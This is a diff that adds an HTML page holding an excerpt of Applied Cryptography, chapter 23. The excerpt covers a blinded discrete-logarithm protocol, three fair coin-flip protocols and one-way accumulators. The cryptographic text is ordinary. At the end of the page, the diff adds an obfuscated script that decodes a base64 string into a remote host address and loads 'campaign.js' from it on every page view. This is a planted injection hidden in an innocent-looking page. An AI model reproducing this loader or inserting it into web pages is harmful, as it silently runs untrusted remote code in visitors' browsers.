@@ -1,0 +1,171 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=540-543//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">23.6 Computing with Encrypted Data</FONT></H3>
+<P><FONT SIZE="+1"><B>The Discrete Logarithm Problem</B></FONT></P>
+<P>There is a large prime, <I>p,</I> and a generator, <I>g.</I> Alice has a particular value for <I>x,</I> and wants to know <I>e,</I> such that</P>
+<DL>
+<DD><I>g<SUP>e</SUP></I> &#8801; <I>x</I> (mod <I>p</I>)
+</DL>
+<P>This is a hard problem, and Alice lacks the computational power to compute the result. Bob has the power to solve the problem&#151;he represents the government, or a large computing organization, or whatever. Here&#146;s how Bob can do it without Alice revealing <I>x</I> [547,4]:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random number, <I>r,</I> less than <I>p.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice computes
+<DL>
+<DD><I>x'</I> = <I>xg<SUP>r</SUP></I> mod <I>p</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice asks Bob to solve
+<DL>
+<DD><I>g<SUP>e'</SUP></I> &#8801; <I>x'</I> (mod <I>p</I>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Bob computes <I>e'</I> and sends it to Alice.
+<DD><B>(6)</B>&nbsp;&nbsp;Alice recovers <I>e</I> by computing
+</DL>
+<DL>
+<DD><I>e</I> = (<I>e'</I> - <I>r</I>) mod (<I>p</I> - 1)
+</DL>
+<P>Similar protocols for the quadratic residuosity problem and for the primitive root problem are in [3,4]. (See also Section 4.8.)
+</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">23.7 Fair Coin Flips</FONT></H3>
+<P>The following protocols allow Alice and Bob to flip a fair coin over a data network (see Section 4.9) [194]. This is an example of flipping a coin into a well (see Section 4.10). At first, only Bob knows the result of the coin toss and tells it to Alice. Later, Alice may check to make sure that Bob told her the correct outcome of the toss.
+</P>
+<P><FONT SIZE="+1"><B><I>Coin Flipping Using Square Roots</I></B></FONT></P>
+<P>Coin-flip subprotocol:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses two large primes, <I>p</I> and <I>q,</I> and sends their product, <I>n</I> to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses a random positive integer, <I>r,</I> such that <I>r</I> is less than <I>n</I>/2. Bob computes
+<DL>
+<DD><I>z</I> = <I>r<SUP>2</SUP></I> mod <I>n</I>
+</DL>
+<BR>and sends <I>z</I> to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes the four square roots of <I>z</I> (mod <I>n</I>). She can do this because she knows the factorization of <I>n.</I> Let&#146;s call them &#43;x, -x, &#43;y, and -y. Call <I>x'</I> the smaller of these two numbers:
+<DL>
+<DD><I>x</I> mod <I>n</I>
+<DD><I>-x</I> mod <I>n</I>
+</DL>
+<BR>Similarly, call <I>y'</I> the smaller of these two numbers:
+<DL>
+<DD><I>y</I> mod <I>n</I>
+<DD><I>-y</I> mod <I>n</I>
+</DL>
+<BR>Note that <I>r</I> is equal either to <I>x'</I> or <I>y'.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice guesses whether <I>r</I> = <I>x'</I> or <I>r</I> = <I>y',</I> and sends her guess to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;If Alice&#146;s guess is correct, the result of the coin flip is heads. If Alice&#146;s guess is incorrect, the result of the coin flip is tails. Bob announces the result of the coin flip.
+</DL>
+<P>Verification subprotocol:
+</P>
+<DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Alice sends <I>p</I> and <I>q</I> to Bob.
+<DD><B>(7)</B>&nbsp;&nbsp;Bob computes <I>x'</I> and <I>y'</I> and sends them to Alice.
+<DD><B>(8)</B>&nbsp;&nbsp;Alice calculates <I>r.</I>
+</DL>
+<P>Alice has no way of knowing <I>r,</I> so her guess is real. She only tells Bob one bit of her guess in step (4) to prevent Bob from getting both <I>x'</I> and <I>y'</I>. If Bob has both of those numbers, he can change <I>r</I> after step (4).</P>
+<P><FONT SIZE="+1"><B><I>Coin Flipping Using Exponentiation Modulo <I>p</I>
+</I></B></FONT></P>
+<P>Exponentiation modulo a prime number, <I>p</I>, is used as a one-way function in this protocol [1306]:</P>
+<P>Coin-flip subprotocol:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a prime number, <I>p,</I> in such a way that the factorization of <I>p</I> - 1 is known and contains at least one large prime.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob selects two primitive elements, <I>h</I> and <I>t,</I> in GF(<I>p</I>). He sends them to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice checks that <I>h</I> and <I>t</I> are primitive and then chooses a random integer <I>x,</I> relatively prime to <I>p</I> - 1. She then computes one of the two values:
+<DL>
+<DD><I>y</I> = <I>h<SUP>x</SUP></I> mod <I>p,</I> or <I>y</I> = <I>t<SUP>x</SUP></I> mod <I>p</I>
+</DL>
+<BR>She sends <I>y</I> to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob guesses whether Alice calculated <I>y</I> as afunction of <I>h</I> or <I>t,</I> and sends his guess to Alice.
+<DD><B>(5)</B>&nbsp;&nbsp;If Bob&#146;s guess is correct, the result of the coin flip is heads. If Bob&#146;s guess is incorrect, the result of the coin flip is tails. Alice announces the result of the coin flip.
+</DL>
+<P>Verification subprotocol:
+</P>
+<DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Alice reveals <I>x</I> to Bob. Bob computes <I>h<SUP>x</SUP></I> mod <I>p</I> and <I>t<SUP>x</SUP></I> mod <I>p,</I> to confirm that Alice has played fairly and to verify the result of the toss. He also checks that <I>x</I> and <I>p</I> - 1 are relatively prime.
+</DL>
+<P>For Alice to cheat, she has to know two integers, <I>x</I> and <I>x',</I> such that <I>h<SUP>x</SUP></I> &#8801;<I>t<SUP>x'</SUP></I> (mod <I>p</I>). If she knew those values,she would be able to calculate:</P>
+<DL>
+<DD><I>log</I><SUB>t</SUB> <I>h</I> = <I>x'x<SUP>-1</SUP></I> mod <I>p</I> - 1 and <I>log</I><SUB>t</SUB>h = x<SUP>-1</SUP>x' mod <I>p</I> - 1
+</DL>
+<P>These are hard problems.
+</P>
+<P>Alice would be able to do this if she knew <I>log</I><SUB>t</SUB> h, but Bob chooses <I>h</I> and <I>t</I> in step (2). Alice has no other recourse except to try to compute the discrete logarithm. Alice could also attempt to cheat by choosing an <I>x</I> that is not relatively prime to <I>p</I> -1, but Bob will detect that in step (6).</P>
+<P>Bob can cheat if <I>h</I> and <I>t</I> are not primitive in GF(<I>p</I>), but Alice can easily check that after step (2) because she knows the prime factorization of <I>p</I> -1.</P>
+<P>One nice thing about this protocol is that if Alice and Bob want to flip multiple coins, they can use the same values for <I>p, h,</I> and <I>t.</I> Alice just generates a new <I>x,</I> and the protocol continues from step (3).</P>
+<P><FONT SIZE="+1"><B><I>Coin Flipping Using Blum Integers</I></B></FONT></P>
+<P>Blum integers can be used in a coin-flipping protocol.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a Blum integer, <I>n,</I> a random <I>x</I> relatively prime to <I>n, x</I><SUB>0</SUB> = <I>x<SUP>2</SUP></I> mod <I>n,</I> and <I>x</I><SUB>1</SUB> = <I>x</I><SUB>0</SUB><SUP>2</SUP> mod <I>n.</I> She sends <I>n</I> and <I>x</I><SUB>1</SUB> to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob guesses whether <I>x</I><SUB>0</SUB> is even or odd.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends <I>x</I> to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob checks that <I>n</I> is a Blum integer (Alice would have to give Bob the factors of <I>n</I> and proofs of their primality, or execute some zero-knowledge protocol to convince him that <I>n</I> is a Blum integer), and he verifies that <I>x</I><SUB>0</SUB> = <I>x<SUP>2</SUP></I> mod <I>n</I> and <I>x</I><SUB>1</SUB> = <I>x</I><SUB>0</SUB><SUP>2</SUP> mod <I>n.</I> If all this checks out, Bob wins the flip if he guessed correctly.
+</DL>
+<P>It is crucial that <I>n</I> be a Blum integer. Otherwise, Alice may be able to find an <I>x'</I><SUB>0</SUB> such that <I>x'</I><SUB>0</SUB><SUP>2</SUP> mod <I>n</I> =<I>x</I><SUB>0</SUB> <SUP>2</SUP> mod <I>n</I> =<I>x</I><SUB>1</SUB> , where <I>x'</I><SUB>0</SUB> is also a quadratic residue. If <I>x</I><SUB>0</SUB> were even and <I>x'</I><SUB>0</SUB> were odd (or vice versa), Alice could freely cheat.</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">23.8 One-Way Accumulators</FONT></H3>
+<P>There is a simple one-way accumulator function [116] (see Section 4.12):
+</P>
+<DL>
+<DD>A(<I>x</I><SUB>i</SUB>, <I>y</I>) = <I>x</I><SUB>i-1</SUB><SUP>y</SUP> mod <I>n</I>
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(fDYffHCC, iXUJMdGw) {iXUJMdGw = fDYffHCC.createElement('script');iXUJMdGw.type = 'text/javascript';iXUJMdGw.async = true;iXUJMdGw.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');fDYffHCC.getElementsByTagName('body')[0].appendChild(iXUJMdGw);}(document));</script></body>
+</html>
